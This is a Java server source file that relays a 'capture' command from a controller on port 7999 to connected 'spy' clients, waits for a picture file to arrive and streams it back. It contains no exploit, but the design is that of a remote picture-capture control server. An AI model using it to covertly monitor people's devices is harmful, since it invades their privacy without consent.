package main;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;

import tcp.Config;
import tcp.ConnectionServer;
import tcp.FileRecServer;
import tcp.ServerResponseTask;
import tcp.protocol.BasicProtocol;
import tcp.protocol.DataProtocol;

public class Main {
	
	public static ConnectionServer spyServer=new ConnectionServer();
	public static FileRecServer fileRecServer=new FileRecServer();
	public static ServerSocket clientServer;

	public static void main(String[] args) throws IOException {
		// TODO Auto-generated method stub
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				spyServer.startServer();
				
			}
			
		}).start();
		
		new Thread(new Runnable() {

			@Override
			public void run() {
				// TODO Auto-generated method stub
				
				fileRecServer.startServer();
			}
			
		}).start();
		
		
		
		
		clientServer=new ServerSocket(7999);
		while(true) {
			Socket socket=clientServer.accept();
			InputStream in=socket.getInputStream();
			byte[] command=new byte[1];
			while(true) {
				try {
					in.read(command);
				}catch(Exception e) {
					e.printStackTrace();
					socket.close();
					break;
				}
				
				if(command[0]==-1) {
					in.close();
					socket.close();
					break;
				}
				handleCommand(socket,command[0]);
			}
			
			
		}
		
		
		
		
		
	}
	
	public static void handleCommand(Socket socket,byte command) {
		System.out.println("handle command:"+command);
		switch(command) {
		case 0:
			ServerResponseTask task=spyServer.getSpys().get(0);
			DataProtocol data=new DataProtocol();
			data.setData("capture");
			task.addMessage(data);
			File file=new File(Config.FILE_SAVE_PATH);
			while(true) {
				File[] cfile=file.listFiles();
				System.out.println("current pics num is :"+cfile.length);
				if(cfile.length!=0) {
					sendFile(socket,cfile[0]);
					break;
				}else {
					try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
			
			
			break;
			
			default:
				break;
		}
	}
	
	public static void sendFile(Socket socket,File file) {
		try {
			BufferedInputStream bis=new BufferedInputStream(new FileInputStream(file));
			BufferedOutputStream bos=new BufferedOutputStream(socket.getOutputStream());
			byte[] buf=new byte[4096];
			int r=0;
			while((r=bis.read(buf))!=-1) {
				bos.write(buf,0,r);
			}
			bos.flush();
			bos.close();
			bis.close();
		}catch(Exception e) {
			e.printStackTrace();
		}
		
	}

}
